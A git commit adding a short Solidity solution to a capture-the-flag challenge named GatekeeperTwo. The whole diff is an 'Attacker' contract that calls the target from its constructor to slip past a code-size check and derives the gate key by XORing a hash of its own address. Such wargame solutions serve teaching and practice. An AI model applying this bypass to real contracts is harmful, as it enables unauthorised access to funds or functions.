cc5338e8ca683415cbdaf73e04640bfac7771687
Gakarot <startradingcentre@gmail.com>
2025-05-14 00:12:25 +0530

    Update solution.sol

--- Challenge_15_GatekeeperTwo/solution.sol
+++ Challenge_15_GatekeeperTwo/solution.sol
@@ -1,1 +1,21 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+
+interface IGatekeeperTwo {
+    function enter(bytes8 _gateKey) external returns (bool);
+}
+
+contract Attacker {
+  
+    constructor (address _target) {
+        IGatekeeperTwo target = IGatekeeperTwo(_target);
+
+        uint64 hash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
+
+        bytes8 key = bytes8(hash ^ type(uint64).max);
+
+        require(target.enter(key),"Failed");
+    }
+}
 
